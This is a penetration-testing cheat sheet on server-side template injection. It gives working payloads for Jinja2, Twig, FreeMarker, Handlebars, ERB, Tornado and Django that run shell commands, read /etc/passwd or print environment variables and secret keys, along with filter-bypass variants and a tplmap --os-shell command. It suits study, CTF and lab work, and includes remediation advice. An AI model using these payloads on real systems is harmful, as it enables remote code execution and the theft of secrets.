# Server-Side Template Injection (SSTI)

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssti_server_side_template_injection](../../../../_badges/hacktricks/pentesting_web/ssti_server_side_template_injection.svg)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/)
[![ssti](../../../../_badges/poat/ssti.svg)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
[![java_ssti](../../../../_badges/rootme/web_server/java_ssti.svg)](https://www.root-me.org/en/Challenges/Web-Server/Java-Server-side-Template-Injection)
[![ssti](../../../../_badges/ps-course/ssti.svg)](https://portswigger.net/web-security/sql-injection)
[![ssti_erb](../../../../_badges/ps-lab/ssti/ssti_erb.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)
[![ssti_tornado](../../../../_badges/ps-lab/ssti/ssti_tornado.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
[![ssti_handlebars](../../../../_badges/ps-lab/ssti/ssti_handlebars.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
[![ssti_tornado](../../../../_badges/ps-lab/ssti/ssti_tornado.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)
[![ssti_freemarker](../../../../_badges/ps-lab/ssti/ssti_freemarker.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
[![ssti_sandboxed_freemarker](../../../../_badges/ps-lab/ssti/ssti_sandboxed_freemarker.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

<div class="row row-cols-lg-2"><div>

Server-Side Template Injection occurs when we can inject code that is parsed by a template engine such as [Jinja2](/programming-languages/web/topics/templating/jinja2/index.md) in Python.

Sometimes, the attack vector may be less explicit. For instance, a form may allow you to select a property (`aaa`, `bbb`, etc.) which is later injected in a template (`{{ xxx.aaa }}`).

You may be able to guess the template engine used from the web server, for instance, if it's Python then it's most likely Jinja.
</div><div>

To guess the template engine, we can try every token (`${{<%[%'"}}%\`) with expressions such as `7*7` or `7*'7'` and look for the output/errors.

* [Port Swigger SSTI Decision Tree](https://portswigger.net/web-security/images/template-decision-tree.png)
* [Template Injection Table](https://cheatsheet.hackmanit.de/template-injection-table/)

There are a few tools you might use:

* [TInjA](https://github.com/Hackmanit/TInjA) <small>(0.3k ‚≠ê)</small>
* [sstimap](https://github.com/vladko312/sstimap) <small>(0.8k ‚≠ê)</small>
* [tplmap](https://github.com/epinna/tplmap) <small>(3.8k ‚≠ê, 2022 ü™¶)</small>

```ps
$ tplmap -u 'http://example.com:80/*'
$ tplmap -u 'http://example.com:80' -d 'xxx=yyy'
$ tplmap -u 'http://example.com:80' -d 'xxx=yyy' --os-shell
```
</div></div>

<hr class="sep-both">

## Jinja2 Template Engine ‚Äî Python

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![jinja2_ssti](../../../../_badges/hacktricks/pentesting_web/ssti_server_side_template_injection/jinja2_ssti.svg)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
[![python_ssti_introduction](../../../../_badges/rootme/web_server/python_ssti_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)
[![django_unchained](../../../../../cybersecurity/_badges/rootme/realist/django_unchained.svg)](https://www.root-me.org/en/Challenges/Realist/Django-unchained)
[![djangocatz](../../../../../cybersecurity/_badges/rootme/realist/djangocatz.svg)](https://www.root-me.org/en/Challenges/Realist/DjangocatZ)

<div class="row row-cols-lg-2"><div>

#### Jinja2 SSTI ‚Äî PoC

Refer to [JinJa2 Notes](/programming-languages/web/topics/templating/jinja2/index.md) if needed.

* Basic Fingerprint PoC: `{{ "PoC" }}` then `{{ "PoC"|e }}`
* Test for instructions: `{% debug %}` and `{% print("PoC") %}`

Try to print the context `{{ self._TemplateReference__context }}`. It's always available unless filtered. It will list which objects are available.

* `self`: a Python object
* `range`: a Python object
* `dict`: a Python object
* `cycler`: a Python object
* `lipsum`: a Python function
* `joiner`: a Python object
* `namespace`: a Python object
* `config`: a Python object
* `request`: a Python object available in Flask render functions

#### Jinja2 SSTI ‚Äî Local Testing

If we don't care about XSS, the shortest code to test is:

```py
from jinja2 import Template
template = Template("""{{ self }}""")
output = template.render()
print(output)
```

If we need to consider XSS, which is the default with Flask, use:

```py
from jinja2 import Environment, select_autoescape
env = Environment(autoescape=select_autoescape(['html', 'xml']))
template = env.from_string("""{{ self }}""")
output = template.render()
print(output)
```

Finally, if we need to test a sandbox environment, e.g. where `self` is empty and only some classes/attributes are allowed:

```py
# Extend sandbox.SandboxedEnvironment to allow attributes
from jinja2 import select_autoescape, DictLoader, sandbox
template_string = """{{ self.__dict__ }}"""
env = sandbox.SandboxedEnvironment(
    loader=DictLoader({'dummy_template': template_string}),
    autoescape=select_autoescape(['html', 'xml'])
)
env.globals = {} # add stuff here
template = env.get_template('dummy_template')
output = template.render()
print(output)
```
</div><div>

#### Jinja2 SSTI ‚Äî Modern payloads

Old payloads were using introspection from `()` or `""` ([ref](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)).

```js!
{{ cycler.__init__.__globals__.os.system('ls') }}
{{ cycler.__init__.__globals__.os.popen("ls -1a").read() }}
{{ lipsum.__globals__.os.popen('ls -1a').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').system('ls') }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('ls -1a').read() }}
```

#### Jinja2 SSTI ‚Äî Filter Bypass

[![python_ssti_introduction](../../../../_badges/rootme/web_server/python_ssti_introduction.svg)](https://www.root-me.org/en/Challenges/Web-Server/Python-Server-side-Template-Injection-Introduction)
[![djangocatz](../../../../../cybersecurity/_badges/rootme/realist/djangocatz.svg)](https://www.root-me.org/en/Challenges/Realist/DjangocatZ)

Refer to my [Python Cheatsheet](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#python) and this summary:

```js!
{{ cycler.__init__.__globals__.os.system('ls') }}
{{ cycler['__init__']['__globals__']['os']['system']('whoami') }}
{{ cycler|attr('__init__')|attr('__globals__')|attr('get')('os')|attr('system')('ls') }}
{{ cycler|attr('__in'+'it__')|[...] }}
{{ cycler|attr('__in'~'it__')|[...] }}
{{ cycler|attr(('@@in'~'it@@'|replace("@", "\u005F")))|[...] }}
{{ lipsum['__builtins__'].__import__('os').system('whoami') }}
{{ iamnotfiltered.__init__.__globals__.__builtins__.__import__('os').system('whoami') }}
```

One thing of importance is that Jinja support a property access syntax with `[]` even for objects such as `os` which natively don't support it.

```js!
{{ cycler['__init__'] }}
{{ self['__dict__'] }}
{{ some_payload.__import__('os')['system'] }}
```

Sometimes, quotes may not be required, while it's rare.

#### Jinja2 SSTI ‚Äî Remediation

Never inject untrusted input in your template before rendering them. Always pass the input as parameters as intended.

```diff
-with open('templates/xxx.html') as f:
-    template = f.read()
-template = template.replace("{{ param1 }}", value1)
-template = template.replace("{{ param2 }}", value2)
-return render_template_string(template)
+return render_template('xxx.html', param1=value1, param2=value2)
```

Flask automatically escape all parameters by default. Otherwise, Jinja default mode requires you to escape all dangerous parameters to avoid XSS. Replace `{{ param1 }}` with `{{ param1|e }}`.

Using the automatic mode is less performant but easier. When using it, you may mark safe parameters as safe with `{{ param3|safe }}`.
</div></div>

<hr class="sep-both">

## Well-Known Template Engines

<div class="row row-cols-lg-2"><div>

#### Twig Template Engine ‚Äî PHP

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)

Link to the [official documentation](https://twig.symfony.com/documentation). [GitHub](https://github.com/twigphp/Twig) <small>(8.2k ‚≠ê)</small>.

* Basic Fingerprint PoC: `{{_self}}`, `{{_self.env}}`
* Random payloads:

```js!
{{_self.env.display("TEST")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname;printenv")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id;uname -a;hostname;printenv")}}
```

üìö Both `exec` and `system` are PHP functions.

<br>

#### Apache FreeMarker Template Engine - Java

[![ssti_freemarker](../../../../_badges/ps-lab/ssti/ssti_freemarker.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)
[![ssti_sandboxed_freemarker](../../../../_badges/ps-lab/ssti/ssti_sandboxed_freemarker.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

`${7/0}` generates an error and expose FreeMarker in the stack trace.

```js!
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("whoami")}
```

You can also read files if you have an object at hand:

```js!
// 'myObject' is an object passed to the template
${myObject.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(",")}
```

<br>

#### Handlebars Template Engine ‚Äî JavaScript

[![ssti_handlebars](../../../../_badges/ps-lab/ssti/ssti_handlebars.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

* Raise an error: ``{{7*7}}``
* Well-known exploit: [CVE-2021-23369](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)

```js!
...
{{this.push "return require('child_process').execSync('whoami');"}}
... 
```
</div><div>

#### Apache Velocity Template Engine ‚Äî Java

Link to the [official documentation](https://velocity.apache.org/).

* Basic PoC: `#set($s=7+7) $s`

<br>

#### ERB Template System ‚Äî Ruby

[![ssti_erb](../../../../_badges/ps-lab/ssti/ssti_erb.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

Link to the [official repository](https://github.com/ruby/erb).

* Basic PoC: `<%= 7*7 %>`
* RCE payload: `<%= system("whoami") %>`

<br>

#### Tornado Web Framework Templates ‚Äî Python

[![server_side_attacks](../../../../_badges/htb/server_side_attacks.svg)](https://academy.hackthebox.com/course/preview/server-side-attacks)
[![ssti_tornado](../../../../_badges/ps-lab/ssti/ssti_tornado.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

Link to the template section of the [official documentation](https://www.tornadoweb.org/en/stable/guide/templates.html).

```js!
{% import os %}
{{os.popen('whoami').read()}}
```

<br>

#### Django Template Engine ‚Äî Python 2.7

[![ssti_django](../../../../_badges/ps-lab/ssti/ssti_django.svg)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

Django can use Jinja2 or its own template engine. You can access attributes such as the app secret key, but you can't invoke functions.

```text!
{{7*'7'}} or {{7*7}} == Error
{% debug %}          == Print all variables
{{settings.SECRET_KEY}} == Print the secret key
{{ messages.storages.0.signer.key }} == Print the secret key (has multiple requirements)
```
</div></div>